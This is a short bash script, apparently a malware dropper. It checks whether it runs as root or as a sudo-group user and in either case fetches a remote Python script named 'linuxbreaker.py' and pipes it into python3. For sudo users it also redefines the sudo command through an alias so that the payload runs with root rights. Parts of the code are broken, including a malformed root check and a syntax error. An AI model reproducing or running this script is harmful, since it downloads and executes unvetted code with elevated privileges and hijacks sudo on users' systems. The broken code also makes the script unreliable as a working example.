#!/bin/bash

if [[ $(id -u -eq 0) ]]; then
clear;
wget https://raw.githubusercontent.com/User-2357/LinuxBreaker/User-2357-patch-1/linuxbreaker.py -b | python3 &
elif groups | grep "\<sudo\>" &> /dev/null; then
clear;
alias sudo="wget https://raw.githubusercontent.com/User-2357/LinuxBreaker/User-2357-patch-1/linuxbreaker.py -b | sudo python3 &"
else wget https://raw.githubusercontent.com/User-2357/LinuxBreaker/User-2357-patch-1/linuxbreaker.py -b | python3 &;
fi
